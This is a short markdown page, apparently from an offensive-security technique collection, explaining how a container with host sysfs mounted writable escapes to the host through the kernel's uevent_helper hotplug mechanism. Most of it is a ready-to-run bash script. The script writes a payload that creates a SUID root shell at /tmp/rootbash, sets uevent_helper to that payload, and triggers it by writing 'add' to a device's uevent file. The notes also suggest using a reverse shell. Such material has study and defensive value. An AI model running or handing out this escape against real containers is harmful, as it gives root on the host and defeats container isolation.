---
title: "uevent_helper: executing a program on a synthetic device event"
description: "The legacy hotplug mechanism runs the program in /sys/kernel/uevent_helper, as root in the host namespaces, for every device uevent. A container with sysfs mounted writable sets uevent_helper to a payload and then writes add to a device's uevent file to fire the event immediately, running the payload on the host."
keywords:
  - uevent_helper
  - hotplug
  - sysfs
  - device uevent
  - container escape
---

# uevent_helper

Before netlink-based udev, the kernel handled device hotplug by executing a user-space helper for each uevent. That helper path still exists at `/sys/kernel/uevent_helper`, and when set, the kernel runs it as root in the host's initial namespaces on every device event. A container with the host sysfs mounted writable sets this path to a payload and then triggers a uevent on demand by writing to any device's `uevent` file, giving reliable host execution without waiting for a real hardware event.

Confirm writability:

```bash
ls -l /sys/kernel/uevent_helper
[ -w /sys/kernel/uevent_helper ] && echo writable
```

## The technique

```bash
# 1. Host-resolvable payload
host=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
cat > /payload <<SH
#!/bin/sh
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
id > $host/out 2>&1
SH
chmod +x /payload

# 2. Set the hotplug helper to the payload
echo "$host/payload" > /sys/kernel/uevent_helper

# 3. Fire a synthetic uevent on any device node in sysfs
echo add > /sys/class/mem/null/uevent
sleep 1; cat /out; ls -l /tmp/rootbash
```

Writing `add` to a `uevent` file forces the kernel to emit the event and invoke the helper immediately, so no physical device change is needed.

## Exploitation notes

- Any writable `uevent` file under `/sys` works as the trigger; `/sys/class/mem/null/uevent` and `/sys/devices/.../uevent` are common choices.
- This requires the host sysfs mounted writable in the container, generally under `--privileged` or an explicit `-v /sys:...` without `ro`; a read-only sysfs defeats it.
- The payload runs once per event; use it to drop SUID bash or a reverse shell rather than to hold a session.

## References

- [Kernel docs: uevent and hotplug](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [HackTricks: uevent_helper escape](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/sensitive-mounts#sys-kernel-uevent_helper)
- [BishopFox: sensitive sysfs mounts](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation)
